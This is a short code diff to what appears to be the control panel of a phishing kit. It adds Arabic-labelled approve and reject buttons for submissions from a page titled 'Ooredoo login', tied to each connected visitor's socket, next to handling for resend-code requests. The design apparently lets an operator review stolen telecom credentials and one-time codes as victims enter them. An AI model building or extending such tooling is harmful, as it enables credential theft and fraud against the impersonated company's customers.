@@ -2029,6 +2029,21 @@
               }, 100);
             }
             
+            // أزرار موافقة/رفض لصفحة تسجيل دخول Ooredoo
+            if (dataEntry.page === 'تسجيل دخول Ooredoo') {
+              const ooredooApproveBtnId = 'ooredoo-approve-' + visitor.socketId + '-' + dataIndex;
+              const ooredooRejectBtnId = 'ooredoo-reject-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + ooredooApproveBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '<button id="' + ooredooRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const approveBtn = document.getElementById(ooredooApproveBtnId);
+                const rejectBtn = document.getElementById(ooredooRejectBtnId);
+                if (approveBtn) approveBtn.addEventListener('click', () => approveForm(visitor.socketId));
+                if (rejectBtn) rejectBtn.addEventListener('click', () => rejectForm(visitor.socketId));
+              }, 100);
+            }
             // إضافة زر موافقة لطلب إعادة إرسال الرمز
             if (dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز') {
               html += '<div class="flex gap-2 mt-3">';
